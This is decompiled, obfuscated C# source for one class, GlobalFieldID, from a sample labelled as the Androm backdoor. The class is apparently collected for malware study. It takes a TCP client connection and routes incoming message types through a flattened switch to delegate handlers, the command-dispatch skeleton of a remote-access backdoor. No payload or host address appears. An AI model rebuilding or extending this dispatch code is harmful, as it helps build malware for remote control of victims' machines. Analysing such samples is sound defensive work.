// Decompiled with JetBrains decompiler
// Type: InvalidOleVariantTypeExcept.Identifiers.GlobalFieldID
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using System.Net.Sockets;
using System.Runtime.CompilerServices;
using TGL.Consumers;
using TGL.Licensing;
using TGL.Polices;

namespace InvalidOleVariantTypeExcept.Identifiers
{
  public class GlobalFieldID : WriterFieldID
  {
    public GlobalFieldID.RoleComparator definition;
    public GlobalFieldID.WatcherFieldID m_Descriptor;
    public GlobalFieldID.AdapterComparator parser;
    public GlobalFieldID.SerializerFieldMessage _Mapping;
    public GlobalFieldID.ObjectComparator template;
    public GlobalFieldID.BaseFieldID m_Algo;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public GlobalFieldID(TcpClient ident)
    {
      UtilsContextLicense.ListWorker();
      // ISSUE: explicit constructor call
      base.\u002Ector(ident);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override void GetResolver(Identifier res)
    {
      int num1 = 3;
      if (GlobalFieldID.AssetInfo())
        goto label_12;
label_1:
      ItemValues itemValues1;
      ItemValues itemValues2 = itemValues1;
      int num2 = 11;
label_11:
      num1 = num2;
label_12:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_28;
          case 1:
            goto label_26;
          case 2:
            goto label_22;
          case 3:
            goto label_2;
          case 4:
            goto label_5;
          case 5:
            switch (itemValues2)
            {
              case (ItemValues) 21:
                this.parser((WriterFieldID) this);
                num1 = 0;
                continue;
              case (ItemValues) 22:
                goto label_18;
              case (ItemValues) 23:
                goto label_10;
              case (ItemValues) 24:
                this.m_Algo((WriterFieldID) this, res);
                num1 = 12;
                continue;
              default:
                goto label_29;
            }
          case 6:
            goto label_19;
          case 7:
            goto label_1;
          case 8:
            goto label_17;
          case 9:
            goto label_14;
          case 10:
            goto label_8;
          case 11:
            goto label_24;
          case 12:
            goto label_6;
          case 13:
            goto label_3;
          default:
            goto label_13;
        }
      }
label_2:
      itemValues1 = res.CreateRecord();
      num2 = 7;
      goto label_11;
label_5:
      switch (itemValues2)
      {
        case (ItemValues) 3:
          this.definition((WriterFieldID) this, res);
          return;
        case (ItemValues) 13:
          this._Mapping((WriterFieldID) this, res);
          num2 = 10;
          goto label_11;
        default:
          num2 = 2;
          goto label_11;
      }
label_10:
      return;
label_29:
      return;
label_28:
      return;
label_26:
      return;
label_22:
      return;
label_19:
      return;
label_17:
      return;
label_14:
      return;
label_8:
      return;
label_6:
      return;
label_3:
      return;
label_13:
      num2 = 1;
      goto label_11;
label_18:
      this.template((WriterFieldID) this, res);
      num2 = 13;
      goto label_11;
label_24:
      if (itemValues2 > (ItemValues) 13)
      {
        if (itemValues2 != (ItemValues) 17)
        {
          num2 = 5;
          goto label_11;
        }
        else
        {
          this.m_Descriptor((WriterFieldID) this, res);
          num2 = 8;
          goto label_11;
        }
      }
      else
      {
        num2 = 4;
        goto label_11;
      }
    }

    internal static bool AssetInfo() => true;

    internal static bool DisableInfo() => false;

    public delegate void RoleComparator(WriterFieldID ut, Identifier msg);

    public delegate void WatcherFieldID(WriterFieldID ut, Identifier msg);

    public delegate void AdapterComparator(WriterFieldID ut);

    public delegate void SerializerFieldMessage(WriterFieldID ut, Identifier msg);

    public delegate void ObjectComparator(WriterFieldID ut, Identifier msg);

    public delegate void BaseFieldID(WriterFieldID ut, Identifier msg);
  }
}
